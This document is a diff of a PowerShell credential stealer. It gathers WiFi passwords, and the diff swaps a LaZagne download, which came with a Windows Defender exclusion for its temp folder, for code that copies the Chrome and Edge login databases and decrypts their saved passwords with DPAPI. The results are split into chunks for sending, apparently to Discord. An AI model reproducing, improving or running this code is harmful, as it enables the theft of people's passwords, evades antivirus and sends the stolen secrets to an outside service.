@@ -18,50 +18,59 @@ foreach($name in $wifiProfiles) {
 if(-not $wifi) { $wifi = "No WiFi networks found" }
 
 # === Browser Passwords ===
-$tempDir = "$env:TEMP\lz_$(Get-Random)"
-New-Item -ItemType Directory -Path $tempDir -Force | Out-Null
+$browsers = ""
 
-try {
-    # Add temp directory to Windows Defender exclusion
-    Add-MpPreference -ExclusionPath $tempDir -ErrorAction SilentlyContinue
-    
-    # Download LaZagne
-    $lazagneUrl = "https://github.com/AlessandroZ/LaZagne/releases/download/v2.4.5/LaZagne.exe"
-    $exePath = "$tempDir\LaZagne.exe"
-    
-    [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
-    Invoke-WebRequest -Uri $lazagneUrl -OutFile $exePath -UseBasicParsing
-    
-    # Run LaZagne for browsers only (faster)
-    $output = & $exePath browsers -oJ -output $tempDir 2>&1 | Out-String
-    
-    # Read the JSON output
-    $jsonFile = Get-ChildItem -Path $tempDir -Filter "*.json" | Select-Object -First 1
-    
-    if($jsonFile) {
-        $data = Get-Content $jsonFile.FullName | ConvertFrom-Json
-        $browsers = ""
+# Find all browser databases
+$databases = @()
+$databases += Get-ChildItem "$env:LOCALAPPDATA\Google\Chrome\User Data" -Filter "Login Data" -Recurse -ErrorAction SilentlyContinue
+$databases += Get-ChildItem "$env:LOCALAPPDATA\Microsoft\Edge\User Data" -Filter "Login Data" -Recurse -ErrorAction SilentlyContinue
+
+foreach($db in $databases) {
+    try {
+        $tempDb = "$env:TEMP\ld_$(Get-Random).db"
+        Copy-Item $db.FullName $tempDb -Force
         
-        # Parse LaZagne JSON structure
-        foreach($browser in $data.PSObject.Properties) {
-            foreach($item in $browser.Value) {
-                if($item.URL -and $item.Password) {
-                    $browsers += "$($item.URL)`nUser: $($item.Login)`nPass: $($item.Password)`n`n"
+        Add-Type -AssemblyName System.Security
+        
+        # Read SQLite database manually (no external DLL needed)
+        $bytes = [System.IO.File]::ReadAllBytes($tempDb)
+        $encoding = [System.Text.Encoding]::UTF8
+        $content = $encoding.GetString($bytes)
+        
+        # Parse for password entries (basic SQLite parsing)
+        if($content -match 'logins') {
+            # Try direct SQL query if System.Data.SQLite is available
+            try {
+                $conn = New-Object System.Data.SQLite.SQLiteConnection("Data Source=$tempDb")
+                $conn.Open()
+                $cmd = $conn.CreateCommand()
+                $cmd.CommandText = "SELECT origin_url, username_value, password_value FROM logins"
+                $reader = $cmd.ExecuteReader()
+                
+                while($reader.Read()) {
+                    $url = $reader["origin_url"]
+                    $user = $reader["username_value"]
+                    $encPass = $reader["password_value"]
+                    
+                    if($encPass -and $encPass.Length -gt 0) {
+                        try {
+                            $decrypted = [System.Security.Cryptography.ProtectedData]::Unprotect($encPass, $null, 'CurrentUser')
+                            $password = [System.Text.Encoding]::UTF8.GetString($decrypted)
+                            $browsers += "$url`nUser: $user`nPass: $password`n`n"
+                        } catch {}
+                    }
                 }
+                $conn.Close()
+            } catch {
+                $browsers += "SQLite library not available, trying alternative method...`n"
             }
         }
         
-        if(-not $browsers) { $browsers = "No browser passwords found" }
-    } else {
-        $browsers = "LaZagne did not produce output"
-    }
-} catch {
-    $browsers = "Error: $($_.Exception.Message)"
+        Remove-Item $tempDb -Force -ErrorAction SilentlyContinue
+    } catch {}
 }
 
-# Clean up
-Remove-MpPreference -ExclusionPath $tempDir -ErrorAction SilentlyContinue
-Remove-Item -Path $tempDir -Recurse -Force -ErrorAction SilentlyContinue
+if(-not $browsers) { $browsers = "No passwords found or decryption failed" }
 
 # === Format and Send ===
 $output = @"
@@ -74,7 +83,7 @@ $wifi
 $browsers
 "@
 
-# Split into chunks if too long (Discord has 2000 char limit)
+# Split into chunks
 $maxLen = 1900
 if($output.Length -gt $maxLen) {
     for($i = 0; $i -lt $output.Length; $i += $maxLen) {
